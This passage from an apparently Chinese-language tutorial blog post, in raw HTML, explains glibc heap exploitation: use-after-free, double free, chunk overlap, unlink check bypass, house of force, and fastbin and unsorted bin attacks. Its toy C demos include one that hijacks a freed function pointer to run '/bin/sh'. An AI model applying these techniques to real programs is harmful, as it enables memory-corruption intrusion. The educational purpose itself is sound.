class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">void</span> <span class=\"params\">(*func_ptr)</span><span class=\"params\">(<span class=\"keyword\">char</span> *)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">sys1</span><span class=\"params\">(<span class=\"keyword\">char</span> command[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">system(command);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">echo</span><span class=\"params\">(<span class=\"keyword\">char</span> content[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\"</span>,content);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    func_ptr *p1=(func_ptr*)<span class=\"built_in\">malloc</span>(<span class=\"number\">4</span>*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>));<span class=\"comment\">//申请了4个int大小的内存</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc addr: %p\\n\"</span>,p1);<span class=\"comment\">//因为前2个也就是0x10是用来管理chunk的</span></span><br><span class=\"line\">    p1[<span class=\"number\">2</span>]=echo;<span class=\"comment\">//所以从第三个开始</span></span><br><span class=\"line\">    p1[<span class=\"number\">2</span>](<span class=\"string\">\"hello world\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1); <span class=\"comment\">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span></span><br><span class=\"line\">    p1[<span class=\"number\">2</span>](<span class=\"string\">\"hello again\\n\"</span>); <span class=\"comment\">//p1指针未被置空,虽然free了,但仍可使用.</span></span><br><span class=\"line\">    func_ptr *p2=(func_ptr*)<span class=\"built_in\">malloc</span>(<span class=\"number\">4</span>*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>));</span><br><span class=\"line\">    <span class=\"comment\">//free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc addr: %p\\n\"</span>,p2);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc addr: %p\\n\"</span>,p1);<span class=\"comment\">//p2与p1指针指向的内存为同一地址</span></span><br><span class=\"line\">    p2[<span class=\"number\">2</span>]=sys1; <span class=\"comment\">//在这里将p1指针里面保存的echo函数指针覆盖成为了sys1指针.</span></span><br><span class=\"line\">    p1[<span class=\"number\">2</span>](<span class=\"string\">\"/bin/sh\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>我们可以看到这个p1和p2的地址是相同的</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219145625345.png\" alt=\"image-20201219145625345\"></p>\n</blockquote>\n<h2 id=\"0x03-Double-Free\"><a href=\"#0x03-Double-Free\" class=\"headerlink\" title=\"0x03 Double Free\"></a>0x03 Double Free</h2><h3 id=\"1-概念-2\"><a href=\"#1-概念-2\" class=\"headerlink\" title=\"1.概念\"></a>1.概念</h3><p>Double Free是UAF较为特殊的一种</p>\n<h3 id=\"2-演示\"><a href=\"#2-演示\" class=\"headerlink\" title=\"2.演示\"></a>2.演示</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Allocating 3 buffers.\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *a = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *c = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(a, <span class=\"string\">\"AAAAAAAA\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(b, <span class=\"string\">\"BBBBBBBB\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(c, <span class=\"string\">\"CCCCCCCC\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"1st malloc(9) %p points to %s\\n\"</span>, a, a);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"2nd malloc(9) %p points to %s\\n\"</span>, b, b);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"3rd malloc(9) %p points to %s\\n\"</span>, c, c);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Freeing the first one %p.\\n\"</span>, a);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Then freeing another one %p.\\n\"</span>, b);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(b);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Freeing the first one %p again.\\n\"</span>, a);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Allocating 3 buffers.\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *d = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *e = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *f = <span class=\"built_in\">malloc</span>(<span class=\"number\">9</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(d, <span class=\"string\">\"DDDDDDDD\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"4st malloc(9) %p points to %s the first time\\n\"</span>, d, d);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(e, <span class=\"string\">\"EEEEEEEE\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"5nd malloc(9) %p points to %s\\n\"</span>, e, e);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(f, <span class=\"string\">\"FFFFFFFF\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"6rd malloc(9) %p points to %s the second time\\n\"</span>, f, f);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160532780.png\" alt=\"image-20201219160532780\"></p>\n<p>直接根据输出理解其中的原理 也就是我上面画的这个图</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160630662.png\" alt=\"image-20201219160630662\"></p>\n</blockquote>\n<h2 id=\"0x04-overlap\"><a href=\"#0x04-overlap\" class=\"headerlink\" title=\"0x04 overlap\"></a>0x04 overlap</h2><h3 id=\"1-概念-3\"><a href=\"#1-概念-3\" class=\"headerlink\" title=\"1.概念\"></a>1.概念</h3><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。</p>\n<h3 id=\"2-利用条件-1\"><a href=\"#2-利用条件-1\" class=\"headerlink\" title=\"2.利用条件\"></a>2.利用条件</h3><ul>\n<li>程序中存在基于堆的漏洞</li>\n<li>漏洞可以控制 chunk header 中的数据</li>\n</ul>\n<h3 id=\"3-演示1（fastbin）\"><a href=\"#3-演示1（fastbin）\" class=\"headerlink\" title=\"3.演示1（fastbin）\"></a>3.演示1（fastbin）</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr,*ptr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//分配第一个0x10的chunk</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//分配第二个0x10的chunk</span></span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//斷點</span></span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr<span class=\"number\">-0x8</span>)=<span class=\"number\">0x41</span>;<span class=\"comment\">// 修改第一个块的size域</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);<span class=\"comment\">// 实现 extend，控制了第二个块的内容</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>直接打断点</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214608484.png\" alt=\"image-20201219214608484\"></p>\n<p>可以看到分配了两个</p>\n<p>这时我们把p1的size位改变再进行释放，就会进入fastbin中</p>\n<p>继续分配我们就可以把p2的数据改变</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214801301.png\" alt=\"image-20201219214801301\"></p>\n<p>fastbin如我们所料</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214832357.png\" alt=\"image-20201219214832357\"></p>\n<p>演示完成 这时我们就可以改变p2的数据</p>\n</blockquote>\n<h3 id=\"4-演示2（smallbin）\"><a href=\"#4-演示2（smallbin）\" class=\"headerlink\" title=\"4.演示2（smallbin）\"></a>4.演示2（smallbin）</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr,*ptr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>);<span class=\"comment\">//分配第一个 0x80 的chunk1</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>); <span class=\"comment\">//分配第二个 0x10 的chunk2</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>); <span class=\"comment\">//防止与top chunk合并</span></span><br><span class=\"line\"></span><br><span class=\"line\">    *(<span class=\"keyword\">int</span> *)((<span class=\"keyword\">int</span>)ptr<span class=\"number\">-0x8</span>)=<span class=\"number\">0xb1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>直接断点</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215247031.png\" alt=\"image-20201219215247031\"></p>\n<p>修改size值之后 释放 进入unsortedbin中</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215357168.png\" alt=\"image-20201219215357168\"></p>\n<p>继续分配</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215517292.png\" alt=\"image-20201219215517292\"></p>\n<p>我们这样就可以直接修改数据了</p>\n</blockquote>\n<h3 id=\"5-演示3（向前overlap）\"><a href=\"#5-演示3（向前overlap）\" class=\"headerlink\" title=\"5.演示3（向前overlap）\"></a>5.演示3（向前overlap）</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);<span class=\"comment\">//smallbin1</span></span><br><span class=\"line\">    ptr2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//fastbin1</span></span><br><span class=\"line\">    ptr3=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//fastbin2</span></span><br><span class=\"line\">    ptr4=<span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);<span class=\"comment\">//smallbin2</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//防止与top合并</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr1);</span><br><span class=\"line\">    *(<span class=\"keyword\">int</span> *)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr4<span class=\"number\">-0x8</span>)=<span class=\"number\">0x90</span>;<span class=\"comment\">//修改pre_inuse域</span></span><br><span class=\"line\">    *(<span class=\"keyword\">int</span> *)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr4<span class=\"number\">-0x10</span>)=<span class=\"number\">0xd0</span>;<span class=\"comment\">//修改pre_size域</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr4);<span class=\"comment\">//unlink进行前向extend</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x150</span>);<span class=\"comment\">//占位块</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>断点</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219220938551.png\" alt=\"image-20201219220938551\"></p>\n<p>修改指针后</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221233429.png\" alt=\"image-20201219221233429\"></p>\n<p>此时释放p4  进入unsortedbin中 如果进行分配 那么我们就可以向前overlap</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221322641.png\" alt=\"image-20201219221322641\"></p>\n<p>我们最后来分配一下</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221445409.png\" alt=\"image-20201219221445409\"></p>\n</blockquote>\n<h2 id=\"0x05-unlink\"><a href=\"#0x05-unlink\" class=\"headerlink\" title=\"0x05 unlink\"></a>0x05 unlink</h2><h3 id=\"1-概念-4\"><a href=\"#1-概念-4\" class=\"headerlink\" title=\"1.概念\"></a>1.概念</h3><ul>\n<li>双向链表中移除/添加一个chunk时，会发生断链的操作，这个断链的过程就叫做unlink</li>\n<li>注意事项：unlink不发生在fastbin和smallbin中，所以fastbin和smallbin容易产生漏洞</li>\n</ul>\n<h3 id=\"2-发生场景\"><a href=\"#2-发生场景\" class=\"headerlink\" title=\"2.发生场景\"></a>2.发生场景</h3><p><strong>malloc时：</strong></p>\n<ul>\n<li>从恰好大小合适的largebin中获取chunk，发生unlink</li>\n<li>从比malloc要求大的largebin中取chunk，发生unlink</li>\n</ul>\n<p><strong>free时：</strong></p>\n<ul>\n<li>free之后，与前后空闲的chunk进行合并</li>\n</ul>\n<p><strong>malloc consolidate时：</strong></p>\n<ul>\n<li>consolidate时，chunk之间的unlink</li>\n</ul>\n<p><strong>realloc时：</strong></p>\n<ul>\n<li>向前扩展，合并物理相邻高地址空闲chunk</li>\n</ul>\n<h3 id=\"3-古老的unlink\"><a href=\"#3-古老的unlink\" class=\"headerlink\" title=\"3.古老的unlink\"></a>3.古老的unlink</h3><p>其中P为需要释放/添加的chunk</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unlink_smallbin_intro.png\" alt=\"img\"></p>\n<p>unlink的代码</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/JgR9imeK6YMQ2rZ.png\" alt=\"image-20200723164353967\"></p>\n<blockquote>\n<p>(1)将前一个chunk占用的内存合并到当前chunk;</p>\n<p>(2)修改指向当前chunk的指针，改为指向前一个chunk。</p>\n<p>(3)使用unlink宏，将前一个free chunk从双向循环链表中移除</p>\n</blockquote>\n<p>此例来自ctf-wiki</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/old_unlink_vul.png\" alt=\"img\"></p>\n<p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p>\n<ul>\n<li>glibc 判断这个块是 small chunk</li>\n<li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li>\n<li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li>\n<li>继而对 Nextchunk 采取 unlink 操作</li>\n</ul>\n<p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p>\n<p><strong>以下12和8都是对于32位来说的</strong></p>\n<ul>\n<li>FD=P-&gt;fd = target addr -12</li>\n<li>BK=P-&gt;bk = expect value</li>\n<li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li>\n<li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li>\n</ul>\n<p>这张图片应该更好理解</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/BTQOKLG2XSyHqge.png\" alt=\"image-20200723165236574\"></p>\n<h3 id=\"4-新的unlink\"><a href=\"#4-新的unlink\" class=\"headerlink\" title=\"4.新的unlink\"></a>4.新的unlink</h3><p>新版的unlink加入了下面这部分代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; fd bk</span><br><span class=\"line\">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \\</span><br><span class=\"line\">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \\</span><br></pre></td></tr></table></figure>\n<p>如果不指向P，那么就出现了问题</p>\n<p>那如何利用呢？</p>\n<p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p>\n<ul>\n<li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li>\n<li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li>\n</ul>\n<p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p>\n<ul>\n<li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li>\n<li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li>\n</ul>\n<p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p>\n<ul>\n<li><code>*P = P - 8</code></li>\n<li><code>*P = P - 12</code></li>\n</ul>\n<p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p>\n<h3 id=\"5-利用条件\"><a href=\"#5-利用条件\" class=\"headerlink\" title=\"5.利用条件\"></a>5.利用条件</h3><ol>\n<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>\n<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>\n</ol>\n<h3 id=\"6-效果\"><a href=\"#6-效果\" class=\"headerlink\" title=\"6.效果\"></a>6.效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>\n<h2 id=\"0x06-house-of-force\"><a href=\"#0x06-house-of-force\" class=\"headerlink\" title=\"0x06 house of force\"></a>0x06 house of force</h2><h3 id=\"1-原理\"><a href=\"#1-原理\" class=\"headerlink\" title=\"1.原理\"></a>1.原理</h3><p>攻击者通过堆溢出或者其他方式，控制到topchunk的size成员，这样我们就可以使topchunk的地址超出正常的堆段的地址，这样我们就可以控制到超出堆段之外的内存</p>\n<h3 id=\"2-利用条件-2\"><a href=\"#2-利用条件-2\" class=\"headerlink\" title=\"2.利用条件\"></a>2.利用条件</h3><ul>\n<li>①通过堆溢出或其他方式，控制到topchunk的size成员</li>\n<li>②将topchunk的size成员变为一个非常大的数，这样topchunk就会超出内存中的堆段，从而访问到其他段的内存地址（got表的地址）</li>\n<li>③此时通过malloc申请内存的时候，申请的就是got的内存地址，就可以更改got内存的内容</li>\n</ul>\n<h2 id=\"0x07-fastbin-attack\"><a href=\"#0x07-fastbin-attack\" class=\"headerlink\" title=\"0x07 fastbin attack\"></a>0x07 fastbin attack</h2><ul>\n<li>Fastbin Double Free</li>\n<li>House of Spirit</li>\n<li>Alloc to Stack</li>\n<li>Arbitrary Alloc</li>\n</ul>\n<p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p>\n<h2 id=\"0x08-unsorted-bin-attack\"><a href=\"#0x08-unsorted-bin-attack\" class=\"headerlink\" title=\"0x08 unsorted bin attack\"></a>0x08 unsorted bin attack</h2><h3 id=\"1-概念-5\"><a href=\"#1-概念-5\" class=\"headerlink\" title=\"1.概念\"></a>1.概念</h3><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p>\n<h3 id=\"2-使用情况\"><a href=\"#2-使用情况\" class=\"headerlink\" title=\"2.使用情况\"></a>2.使用情况</h3><ol>\n<li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li>\n<li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li>\n</ol>\n<h3 id=\"3-原理解释\"><a href=\"#3-原理解释\" class=\"headerlink\" 